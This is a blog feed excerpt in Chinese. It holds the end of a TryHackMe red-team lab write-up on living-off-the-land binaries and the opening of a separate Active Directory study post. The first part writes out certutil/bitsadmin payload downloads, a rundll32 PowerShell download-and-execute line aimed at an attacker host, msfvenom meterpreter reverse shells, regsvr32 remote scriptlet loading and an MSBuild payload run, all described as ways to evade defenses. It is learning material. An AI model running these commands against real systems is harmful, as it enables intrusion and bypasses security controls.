#E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Temp</span><span style="color: #ABB2BF">\payload.exe</span></span></code></pre></div></div></figure><ul><li>-urlcache 显示 URL，启用命令中可使用的 URL 选项</li><li>-split -f 用于从提供的 URL 拆分并强制获取文件</li></ul><p>此外，certutil.exe 可用作编码工具，我们可以用它对文件进行编码并解码文件内容。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">certutil</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">encode</span><span style="color: #ABB2BF"> payload.exe </span><span style="color: #E06C75">Encoded</span><span style="color: #ABB2BF">-payload.txt</span></span><span class="line"><span style="color: #ABB2BF"># 解码</span></span><span class="line"><span style="color: #E06C75">certutil</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">decode</span><span style="color: #ABB2BF"> enc_thm_0YmFiOG_file.txt plain.txt</span></span></code></pre></div></div></figure><p>更多信息可以参考：<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Microsoft Docs: CertUtil</a></p><h3 id="BITSAdmin"><a href="#BITSAdmin" class="headerlink" title="BITSAdmin"></a>BITSAdmin</h3><p><code>bitsadmin</code> 工具是一个系统管理员实用程序，可用于创建、下载或上传后台智能传输服务（BITS）任务并检查其进度。<a href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal">BITS</a> 是一种用于从 HTTP 网络服务器和 SMB 服务器下载和上传文件的低带宽、异步方法。</p><p>攻击者可能滥用 BITS 任务在被入侵的机器上下载并执行恶意 payload。有关该技术的更多信息，您可以访问 ATT&amp;CK <a href="https://attack.mitre.org/techniques/T1197/">T1197</a> 页面。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">bitsadmin.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">transfer</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">Download</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">priority</span><span style="color: #ABB2BF"> Foreground http://</span><span style="color: #D19A66">10.6.4.118</span><span style="color: #ABB2BF">/payload.exe c:\</span><span style="color: #E06C75">Users</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">thm</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Desktop</span><span style="color: #ABB2BF">\payload.exe</span></span></code></pre></div></div></figure><ul><li>&#x2F;Transfer 使用转移选项</li><li>&#x2F;Download 我们正在使用下载类型指定传输</li><li>&#x2F;Priority 优先级设置为在前台运行</li></ul><p>有关 bitsadmin 工具的更多信息，请参阅 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin">Microsoft Docs</a>。</p><h3 id="FindStr"><a href="#FindStr" class="headerlink" title="FindStr"></a>FindStr</h3><p>使用 findstr.exe 从网络内的 SMB 共享文件夹下载远程文件，方法如下</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">C:\</span><span style="color: #E06C75">Users</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">thm</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">findstr</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">V</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">dummystring</span><span style="color: #ABB2BF"> \\</span><span style="color: #E06C75">MachineName</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">ShareFolder</span><span style="color: #ABB2BF">\test.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> &gt;</span><span style="color: #E06C75"> c</span><span style="color: #ABB2BF">:\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Temp</span><span style="color: #ABB2BF">\test.exe</span></span></code></pre></div></div></figure><ul><li><code>/V</code> 打印出不包含所提供字符串的行。</li><li><code>dummystring</code> 要搜索的文本；在这种情况下，我们提供一个不得在文件中出现的字符串。</li><li><code> &gt; c:\Windows\Temp\test.exe</code> 将输出重定向到目标机器上的一个文件。</li></ul><p>请注意，其他工具也可用于该文件操作。我们建议访问 <a href="https://lolbas-project.github.io/">LOLBAS</a> 以查看它们。</p><h2 id="文件执行"><a href="#文件执行" class="headerlink" title="文件执行"></a>文件执行</h2><p>除了常见的如通过命令行 <code>cmd.exe</code> 或桌面快捷方式启动之外，攻击者还会滥用合法的系统二进制文件来执行载荷。</p><p>这种方法被称为 <strong>“已签名二进制代理执行”（Signed Binary Proxy Execution）</strong> 或 <strong>“间接命令执行”（Indirect Command Execution）</strong>。根据 MITRE ATT&amp;CK 框架，这种技术的核心是利用操作系统自带的、通常被认为是“可信”的工具来生成并执行恶意载荷。</p><p>这样做有两个主要目的：</p><ol><li><strong>隐藏恶意载荷的进程</strong>：使恶意活动看起来像是合法的系统进程。</li><li><strong>规避安全防御</strong>：利用这些已签名的、白名单内的系统工具，可以有效绕过安全产品的检测和防御。</li></ol><h3 id="File-Explorer"><a href="#File-Explorer" class="headerlink" title="File Explorer"></a>File Explorer</h3><p>文件资源管理器是 Windows 的文件管理器和系统组件。人们发现使用文件资源管理器的可执行文件可以执行其他 .exe 文件。这种技术称为间接命令执行（Indirect Command Execution），即可以利用并滥用 explorer.exe 工具从受信任的父进程启动恶意脚本或可执行文件。</p><p>explorer.exe 二进制文件位于：</p><ul><li>C:\Windows\explorer.exe for the Windows 64-bit version.</li><li>C:\Windows\SysWOW64\explorer.exe for the Windows 32-bit version.</li></ul><p>为了以 explorer.exe 作为父进程创建子进程，我们可以执行以下命令：</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">explorer.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">root</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;C:\Windows\System32\calc.exe&quot;</span></span></code></pre></div></div></figure><h3 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h3><p>Windows Management Instrumentation (WMIC) 是一个管理 Windows 组件的命令行工具。有人发现 WMIC 也被用于执行二进制文件以规避防御措施。MITRE ATT&amp;CK 框架将该技术称为签名二进制代理执行 (<a href="https://attack.mitre.org/techniques/T1218/">T1218</a>)</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">wmic.exe process</span><span style="color: #C678DD"> call </span><span style="color: #ABB2BF">create calc</span></span></code></pre></div></div></figure><h3 id="Rundll32"><a href="#Rundll32" class="headerlink" title="Rundll32"></a>Rundll32</h3><p>Rundll32 是微软内置的工具，用于在操作系统内加载并运行动态链接库（DLL）文件。红队可以滥用并利用 rundll32.exe 来运行任意 payload 并执行 JavaScript 与 PowerShell 脚本。MITRE ATT&amp;CK 框架将此识别为<strong>签名二进制代理执行：Rundll32</strong>，并将其标识为 <a href="https://attack.mitre.org/techniques/T1218/011/">T1218</a>。</p><p>rundll32.exe 二进制文件位于：</p><ul><li>C:\Windows\System32\rundll32.exe for the Windows 64-bit version.</li><li>C:\Windows\SysWOW64\rundll32.exe for the Windows 32-bit version.</li></ul><p>使用包含 JavaScript 组件 eval() 的 <code>rundll32.exe</code> 二进制文件来执行 <code>calc.exe</code>。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">rundll32.exe javascript:</span><span style="color: #98C379">&quot;\..\mshtml.dll,RunHTMLApplication &quot;</span><span style="color: #ABB2BF">;</span><span style="color: #56B6C2">eval</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;w=new ActiveXObject(\&quot;</span><span style="color: #ABB2BF">WScript.</span><span style="color: #E06C75">Shell</span><span style="color: #ABB2BF">\</span><span style="color: #98C379">&quot;);w.run(\&quot;</span><span style="color: #E06C75">calc</span><span style="color: #ABB2BF">\</span><span style="color: #98C379">&quot;);window.close()&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>我们也可以使用 <code>rundll32.exe</code> 来执行 PowerShell 脚本。下面的命令运行一个 JavaScript，该脚本通过 <code>rundll32.exe</code> 执行一个 PowerShell 脚本，从远程网站下载内容。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://AttackBox_IP/script.ps1&#39;);&quot;);</span></span></code></pre></div></div></figure><h2 id="应用白名单绕过"><a href="#应用白名单绕过" class="headerlink" title="应用白名单绕过"></a>应用白名单绕过</h2><p>应用白名单是微软终端安全功能，用于实时阻止恶意和未授权程序的执行。应用白名单基于规则，指定允许出现在操作系统上并被执行的已批准应用或可执行文件列表。</p><h3 id="Regsvr32"><a href="#Regsvr32" class="headerlink" title="Regsvr32"></a>Regsvr32</h3><p>Regsvr32 是微软的一个命令行工具，用于在 Windows 注册表中注册和注销动态链接库（DLL）。regsvr.exe 可执行文件位于：</p><ul><li>C:\Windows\System32\regsvr32.exe for the Windows 32 bits version</li><li>C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version</li></ul><p>除了其预期用途外，<code>regsvr32.exe</code> 二进制文件还可以用于执行任意二进制文件并绕过 Windows 应用白名单。根据 <a href="https://redcanary.com/">Red Canary</a> 的报告，<code>regsvr32.exe</code> 是第三大流行的 <a href="https://attack.mitre.org/techniques/T1218/010/">ATT&amp;CK</a> 技术。对手利用 <code>regsvr32.exe</code> 在本地或远程执行本机代码或脚本。<code>regsvr32.exe</code> 使用的技术利用了受信任的 Windows 操作系统组件并在内存中执行，这也是该技术常被用来绕过应用白名单的原因之一。</p><p>让我们使用 msvenom 创建一个恶意的 DLL 文件，并设置 Metasploit 监听器以接收反向 shell。我们将创建一个适用于 32 位操作系统的恶意文件。我们将使用 regsvr32.exe 应用白名单绕过技术在目标系统上运行命令。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/meterpreter/reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=tun0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">443</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dll</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x86</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">live0fftheland.dll</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">msfconsole</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-q</span></span><span class="line"><span style="color: #61AFEF">use</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exploit/multi/handler</span><span style="color: #ABB2BF"> </span></span><span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">payload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/meterpreter/reverse_tcp</span><span style="color: #ABB2BF"> </span></span><span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span></span><span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">443</span><span style="color: #ABB2BF"> </span></span><span class="line"><span style="color: #61AFEF">exploit</span></span></code></pre></div></div></figure><p>然后传到靶机上，不传也行。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">c:\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">System32</span><span style="color: #ABB2BF">\regsvr32.exe c:\</span><span style="color: #E06C75">Users</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">thm</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Downloads</span><span style="color: #ABB2BF">\live0fftheland.dll</span></span><span class="line"><span style="color: #ABB2BF"># 远程执行</span></span><span class="line"><span style="color: #ABB2BF">c:\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">System32</span><span style="color: #ABB2BF">\regsvr32.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">n</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF">:http://example.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF">/file.sct </span><span style="color: #E06C75">Downloads</span><span style="color: #ABB2BF">\live0fftheland.dll</span></span></code></pre></div></div></figure><p>第二个选项，这是一个更高级的命令，我们指示 regsvr32.exe 运行：</p><ul><li><code>/s</code>：静默模式（不显示消息）</li><li><code>/n</code>：不要调用 DLL 注册服务器</li><li><code>/i</code>: 因为我们用了 &#x2F;n，所以改用另一台服务器</li><li><code>/u</code>：使用未注册方法运行</li></ul><p>如果我们想创建一个 64 位的 DLL 版本，需要在 msfvenom 命令中指定，并在受害者机器上使用位于 C:\Windows\SysWOW64\regsvr32.exe 的 64 位 <code>regsvr32.exe</code> 来运行它。</p><h3 id="Bourne-Again-Shell-Bash"><a href="#Bourne-Again-Shell-Bash" class="headerlink" title="Bourne Again Shell (Bash)"></a>Bourne Again Shell (Bash)</h3><p>在 2016 年，微软为 Windows 10、11 和 Server 2019 增加了对 Linux 环境的支持。此功能称为 Windows 子系统用于 Linux（WSL），并存在两个版本：WSL1 和 WSL2。WSL 是在操作系统上运行的通过 Hyper-V 虚拟化的 Linux 发行版，支持一部分 Linux 内核和系统调用。此功能是用户可以安装并与之交互的附加组件。作为 WSL 的一部分，bash.exe 是用于与该 Linux 环境交互的微软工具。</p><p>人们找到了利用该 Microsoft 签名二进制文件来执行 payload 并绕过 Windows 应用程序白名单的方法。通过执行 <code>bash.exe -c &quot;path-to-payload&quot;</code>，我们可以执行任何未签名的 payload。ATT&amp;CK 将这称为间接命令执行（Indirect Command execution）技术，攻击者滥用 Windows 工具实用程序以获取命令执行。有关此技术的更多信息，您可以访问 <a href="https://attack.mitre.org/techniques/T1202/">T1202</a> ATT&amp;CK 网站。</p><p>需要在 Windows 10 中启用并安装 Windows 子系统以使用 <code>bash.exe</code> 二进制文件。此外，附带的虚拟机由于嵌套虚拟化限制未启用该 Linux 子系统。</p><h2 id="其他技术"><a href="#其他技术" class="headerlink" title="其他技术"></a>其他技术</h2><p>本节提了几种有趣的技术，可用于初始访问或保活。</p><h3 id="Shortcuts-快捷方式"><a href="#Shortcuts-快捷方式" class="headerlink" title="Shortcuts 快捷方式"></a>Shortcuts 快捷方式</h3><p>当用户点击快捷方式文件时，被引用的文件或应用程序会被执行。红队经常利用此技术来获得初始访问权限、提升权限或实现持久性。MITRE ATT&amp;CK 框架将此快捷方式修改技术称为 <a href="https://attack.mitre.org/techniques/T1547/009/">T1547</a>，攻击者通过创建或修改快捷方式来利用该技术。</p><p>要使用快捷方式修改技术，我们可以将目标部分设置为使用以下命令来执行文件：</p><ul><li>Rundll32</li><li>Powershell</li><li>Regsvr32</li><li>硬盘上的可执行文件</li></ul><p>房间里给的 demo 是我们之前用 <code>rundll32.exe</code> 执行计算器的，我们要复现直接把之前的那条命令粘贴到目标里面的</p><p>这里有几个快捷方式修改的 demo：<a href="https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md">https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md</a></p><h3 id="No-PowerShell"><a href="#No-PowerShell" class="headerlink" title="No PowerShell!"></a>No PowerShell!</h3><p>2019 年，Red Canary 发布了一份威胁检测报告，指出 PowerShell 是用于恶意活动的最常见技术。因此，各组织开始监控或阻止 powershell.exe 的执行。结果，对手开始寻找在不直接启动 powershell.exe 的情况下运行 PowerShell 代码的其他方法。</p><p>PowerLessShell 是一个基于 Python 的工具，用于生成在目标机器上运行的恶意代码，同时不会显示 PowerShell 进程的实例。PowerLessShell 依赖滥用 Microsoft Build Engine (MSBuild) —— 一个用于构建 Windows 应用程序的平台 —— 来执行远程代码。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 下载项目文件</span></span><span class="line"><span style="color: #61AFEF">git</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">clone</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">https://github.com/Mr-Un1k0d3r/PowerLessShell.git</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 生成一个 PowerShell payload</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/meterpreter/reverse_winhttps</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">4443</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">psh-reflection</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">liv0ff.ps1</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 启动好 MSF handler</span></span><span class="line"><span style="color: #61AFEF">msfconsole</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-q</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost 10.11.141.2;set lport 4443;exploit&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 生成 csproj 文件</span></span><span class="line"><span style="color: #61AFEF">python2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PowerLessShell.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-type</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">powershell</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-source</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/tmp/liv0ff.ps1</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-output</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">liv0ff.csproj</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 下载文件</span></span><span class="line"><span style="color: #61AFEF">bitsadmin.exe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/transfer</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/Download</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/priority</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Foreground</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://10.6.4.118/liv0ff.csproj</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">c:</span><span style="color: #56B6C2">\U</span><span style="color: #98C379">sers</span><span style="color: #56B6C2">\t</span><span style="color: #98C379">hm</span><span style="color: #56B6C2">\D</span><span style="color: #98C379">esktop</span><span style="color: #56B6C2">\l</span><span style="color: #98C379">iv0ff.csproj</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 目标机器上编译就执行了</span></span><span class="line"><span style="color: #61AFEF">c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">c:</span><span style="color: #56B6C2">\U</span><span style="color: #98C379">sers</span><span style="color: #56B6C2">\t</span><span style="color: #98C379">hm</span><span style="color: #56B6C2">\D</span><span style="color: #98C379">esktop</span><span style="color: #56B6C2">\l</span><span style="color: #98C379">iv0ff.csproj</span></span></code></pre></div></div></figure><p>我跑起来了，拿到 flag，但是攻击机上没有 shell 回连，不知道啥情况。</p><h2 id="现实场景"><a href="#现实场景" class="headerlink" title="现实场景"></a>现实场景</h2><p>2017 年，Windows Defender 高级威胁防护（<a href="https://www.microsoft.com/security/blog/2018/11/15/whats-new-in-windows-defender-atp/">Windows Defender ATP</a>）研究团队发现了一种名为 Astaroth 的无文件恶意软件。无文件恶意软件指的是在系统中运行并执行但不写入磁盘的恶意软件。该恶意软件在受害设备的内存中执行其所有功能。</p><p>Astaroth 被认为是一种信息窃取器，会从受害用户处获取敏感信息，例如账户凭据、按键记录和其他数据，并将其发送给攻击者。该恶意软件依赖多种先进技术来执行不同功能，如反调试、反虚拟化、反仿真技巧、进程掏空（process hollowing）、NTFS 备用数据流（ADS）以及“借用现有系统工具”（Living off the land）二进制文件。</p><p>在初始访问阶段，攻击者依赖包含恶意附件文件的垃圾邮件活动。所附文件是一个 LNK 快捷方式文件，一旦受害者点击它，将导致以下情况：</p><ul><li>执行了一个 WMIC 命令以下载并运行 Javascript 代码。</li><li>滥用 BITSadmin 从指挥控制服务器下载多个二进制文件。有趣的是，在某些情况下，恶意软件会使用 YouTube 频道描述来隐藏它们的 C2 服务器命令。</li><li>使用 BITSadmin、ADS 技术，将其二进制文件隐藏在系统内以实现持久性。</li><li>使用 Certutil 工具将几个下载的有效载荷解码为 DLL 文件。</li><li>这些 DLL 文件使用 Regsvr32 执行。</li></ul><p>有关该恶意软件及其检测的更多详细信息，建议查阅以下参考资料：</p><ol><li><a href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/">Astaroth: Banking Trojan</a></li><li><a href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/microsoft-discovers-fileless-malware-campaign-dropping-astaroth-info-stealer">Microsoft Discovers Fileless Malware Campaign Dropping Astaroth Info Stealer</a></li><li><a href="https://www.zdnet.com/article/astaroth-malware-hides-command-servers-in-youtube-channel-descriptions/">Astaroth malware hides command servers in YouTube channel descriptions</a></li></ol><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>在本房间中，我们介绍了“就地取材”（Living Off the Land）的一般概念，并回顾了一些在红队演练中见到和使用的示例。就地取材技术可用于多种目的，包括侦察、文件操作、执行二进制文件，以及实现持久化和绕过安全措施。</p><h3 id="其他资源"><a href="#其他资源" class="headerlink" title="其他资源"></a>其他资源</h3><ul><li><a href="https://gtfobins.github.io/">GTFOBins</a> - The Linux version of the LOLBAS project.</li><li><a href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/">Astaroth: Banking Trojan</a> - A real-life malware analysis where they showcase using the Living Off the Land technique used by Malware.</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是 TryHackMe Red Teaming Path 的 Host Evasions 部分，因为我是从 JR -&amp;gt; WAP -&amp;gt; Offensive Pentesting 这样学过来的，所以前面的很多房间学完了，AD 也在 OP 里面学完了，所以就这一部分</summary>
      
    
    
    
    <category term="THM" scheme="https://blog.irec.moe/categories/THM/"/>
    
    
    <category term="Windows" scheme="https://blog.irec.moe/tags/Windows/"/>
    
    <category term="C#" scheme="https://blog.irec.moe/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Try Hack Me - Active Directory</title>
    <link href="https://blog.irec.moe/thm_ad.html"/>
    <id>https://blog.irec.moe/thm_ad.html</id>
    <published>2025-08-09T16:00:00.000Z</published>
    <updated>2025-08-09T16:53:32.682Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这是我在 <a href="https://tryhackme.com/">TryHackMe</a> 里面学习 Windows Active Directory 相关渗透技巧的记录，推荐当做一个官方之外的 WriteUp 来阅读，直接阅读你会看不懂的。说实话各个房间设计的都挺巧妙的，虽然也有很多 Bug，不过利用搜索引擎和官方的 Discord 群组能解决。</p><p>这一部分我耗时一个星期完成，大多都是我的学习记录和理解，希望里面的内容能帮到你们。</p><h1 id="Active-Directory-Basics"><a href="#Active-Directory-Basics" class="headerlink" title="Active Directory Basics"></a>Active Directory Basics</h1><p>这个房间主要是讲了一下 AD 的基础，还有实操了一下 GPO</p><h2 id="Windows-域"><a href="#Windows-域" class="headerlink" title="Windows 域"></a>Windows 域</h2><p><strong>Windows 域</strong>是受特定企业管理的一组用户和计算机。域的主要理念是将 Windows 计算机网络的常用组件集中管理到一个名为Active Directory ( AD )的存储库中。运行 Active Directory 服务的服务器称为**域控制器 ( DC )**。</p><img src="/thm_ad/bebe5dfec0208bf563d01fa2dd1fb7a7.png" class="" title="Windows 域概述"><p>配置 Windows 域的主要优点是：</p><ul><li><strong>集中身份管理：</strong>可以轻松从 Active Directory 配置整个网络的所有用户。</li><li><strong>管理安全策略：</strong>您可以直接从 Active Directory 配置安全策略，并根据需要将其应用于网络上的用户和计算机。</li></ul><h2 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h2><p>Windows 域的核心是 AD DS (Active Directory Domain Service)，这项服务就像一个目录，保存着网络上所有“对象”的信息。在 AD 支持的众多对象中，有用户、组、机器、打印机、共享等。让我们来看看其中的一些：</p><h3 id="Users-用户"><a href="#Users-用户" class="headerlink" title="Users 用户"></a>Users 用户</h3><p>用户是一种被称为安全主体的对象。<strong>安全主体</strong>是一个通用的概念，它指的是任何可以被域认证身份（如通过密码），并被<strong>授予权限</strong>来访问和操作网络中各种资源（如文件、打印机）的实体。</p><p>用户可用于代表两类实体：</p><ul><li>People：用户通常代表组织中需要访问网络的人员，如员工。</li><li>Service：您也可以定义用户供 <code>IIS</code> 或 <code>MSSQL</code> 等服务使用。每个服务都需要用户才能运行，但服务用户与普通用户不同，他们只拥有运行特定服务所需的权限。</li></ul><h3 id="Machines-机器"><a href="#Machines-机器" class="headerlink" title="Machines 机器"></a>Machines 机器</h3><p>机器是 Active Directory 中的另一种对象类型；每台加入 Active Directory 域的计算机都会创建一个机器对象。机器也被视为安全主体，与普通用户一样被分配一个账户。该账户在域内的权限有限。</p><p>机器账户本身是指定计算机上的本地管理员，除了计算机本身外，一般不允许任何人访问，但与其他账户一样，如果你有密码，就可以用它登录。</p><p>机器账户的密码会被自动轮换，它由120个随机字符串组成，机器账户是由机器名后加一个 $ 符号组成，比如 <code>DC01</code> 机器会有一个 <code>DC01$</code> 账户。</p><h3 id="Security-Groups-安全组"><a href="#Security-Groups-安全组" class="headerlink" title="Security Groups 安全组"></a>Security Groups 安全组</h3><p>如果你熟悉 Windows，你可能知道可以定义用户组，将文件或其他资源的访问权限分配给整个组，而不是单个用户。这样可以更好地进行管理，因为你可以将用户添加到现有组中，他们将自动继承该组的所有权限。安全组也被视为安全负责人，因此可以拥有对网络资源的权限。</p><p>组的成员既可以是用户，也可以是机器。如果需要，组还可以包括其他组。</p><p>域中默认创建了几个组，可用于向用户授予特定权限。下面举例说明域中最重要的几个组：</p><table><thead><tr><th><strong>Security Group</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>Domain Admins</td><td>该组的用户拥有整个域的管理权限。默认情况下，他们可以管理域上的任何计算机，包括 DC。</td></tr><tr><td>Server Operators</td><td>该组中的用户可以管理域控制器。他们不能更改任何管理组的成员资格。</td></tr><tr><td>Backup Operators</td><td>该组的用户可以访问任何文件，无需考虑其权限。它们用于执行计算机数据备份。</td></tr><tr><td>Account Operators</td><td>该组中的用户可以创建或修改域中的其他账户。</td></tr><tr><td>Domain Users</td><td>Includes all existing user accounts in the domain.</td></tr><tr><td>Domain Computers</td><td>Includes all existing computers in the domain.</td></tr><tr><td>Domain Controllers</td><td>Includes all existing DCs on the domain.</td></tr></tbody></table><p>关于默认安全组的微软文档：<a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups</a></p><h3 id="Organizational-Units-管理单元"><a href="#Organizational-Units-管理单元" class="headerlink" title="Organizational Units 管理单元"></a>Organizational Units 